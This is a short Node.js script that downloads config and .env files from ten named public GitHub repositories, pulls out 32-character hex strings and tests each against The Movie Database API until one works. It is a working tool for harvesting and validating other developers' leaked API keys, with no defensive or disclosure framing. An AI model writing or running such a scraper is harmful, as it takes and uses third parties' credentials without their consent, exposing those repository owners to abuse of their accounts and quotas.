const repoUrls = [
  "https://raw.githubusercontent.com/shreyaswankhede/movie-app/master/src/components/Home.js",
  "https://raw.githubusercontent.com/shreyaswankhede/movie-app/master/src/config.js",
  "https://raw.githubusercontent.com/maddybecker/TheMovieDatabase/master/index.js",
  "https://raw.githubusercontent.com/scastillo-b/movie-app-react/master/.env",
  "https://raw.githubusercontent.com/iamshreyas/react-movie-app/master/src/components/Home.js",
  "https://raw.githubusercontent.com/shubhampatilsd/movie-buff/master/src/api/tmdb.js",
  "https://raw.githubusercontent.com/shubhampatilsd/movie-buff/master/.env",
  "https://raw.githubusercontent.com/mariosf/react-movie-db/master/src/config.js",
  "https://raw.githubusercontent.com/fe-novice/react-movie-app/master/.env",
  "https://raw.githubusercontent.com/sudheerj/reactjs-movie-app/master/src/config/Config.js"
];

async function run() {
  console.log("Fetching raw config files from GitHub to locate hardcoded TMDB API keys...");
  const potentialKeys = new Set();

  for (const url of repoUrls) {
    try {
      const res = await fetch(url);
      if (res.ok) {
        const text = await res.text();
        // Look for 32-character hex strings
        const matches = text.match(/[a-f0-9]{32}/gi);
        if (matches) {
          matches.forEach(k => potentialKeys.add(k));
          console.log(`Found potential keys in ${url}:`, matches);
        }
      }
    } catch (e) {
      console.log(`Failed to fetch ${url}: ${e.message}`);
    }
  }

  console.log(`\nFound ${potentialKeys.size} total candidate keys. Testing them...`);
  for (const key of potentialKeys) {
    try {
      const res = await fetch(`https://api.themoviedb.org/3/movie/550?api_key=${key}`);
      if (res.ok) {
        console.log(`\n🎉 WORKING KEY FOUND: ${key}\n`);
        process.exit(0);
      } else {
        console.log(`Key ${key} failed with status: ${res.status}`);
      }
    } catch (e) {
      console.log(`Key ${key} error:`, e.message);
    }
  }
  console.log("No working key found.");
}

run();
